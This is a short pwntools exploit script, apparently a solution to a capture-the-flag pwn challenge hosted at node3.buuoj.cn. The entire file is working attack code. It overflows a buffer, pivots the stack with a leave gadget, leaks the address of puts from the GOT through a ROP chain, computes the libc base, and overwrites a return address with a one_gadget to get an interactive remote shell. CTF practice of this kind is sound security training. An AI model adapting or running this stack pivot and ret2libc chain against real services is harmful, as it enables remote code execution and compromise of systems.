from pwn import *

io=remote('node3.buuoj.cn','29302')

bank=0x0601080
leave=0x400699
puts_plt=0x04004E0
puts_got=0x0601018
pop_rdi=0x400703
main=0x0400626
ret=0x4004c9

io.recvuntil('u want')
pl1='a'*0x60+p64(bank)+p64(leave)
io.send(pl1)
io.recvuntil('now!')
pl2=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(pl2)
io.recvline()
puts_add=u64(io.recv(6).ljust(8,'\x00'))
libc_base=puts_add-0x06f690
one_gadget=libc_base+0x4526a
pl3='a'*0x60+'bbbbbbbb'+p64(one_gadget)
io.send(pl3)
io.send('a')

io.interactive()